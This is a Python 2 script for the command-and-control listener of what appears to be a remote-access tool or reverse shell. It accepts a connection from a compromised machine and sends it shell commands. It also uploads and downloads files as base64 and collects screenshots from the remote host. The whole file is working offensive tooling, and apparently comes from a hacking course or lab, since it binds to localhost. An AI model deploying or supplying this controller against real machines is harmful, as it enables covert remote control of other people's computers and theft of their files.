import socket, subprocess, os, sys, json, base64, json, shlex

class Server:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Waiting for connections..")
        self.connection, address = listener.accept()
        print("Connection received from "+str(address))

    def read_files(self, path):
        with open(path, 'rb')as file:
            return base64.b64encode(file.read())

    def write_files(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Success'

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exe_cmd(self, command):
        self.json_send(command)
        if command[0] == 'exit':
            self.connection.close()
            sys.exit()
        return self.json_recv()

    def run(self):
        while True:
            command = raw_input(">>")
            command = shlex.split(command)
            try:
                if command[0] == "upload":
                    content = self.read_files(command[1])
                    command.append(content)

                result = self.exe_cmd(command)

                if command[0] == 'download':
                    result = self.write_files(command[1], result)
                elif command[0] == 'screenshot':
                    self.write_files('screen111.png',result)
                    result = '[+] Screenshot Taken and saved'


            except Exception:
                result = '[-] Error in run() [Server]'

            print(result)

server = Server('127.0.0.1', 8888)
server.run()
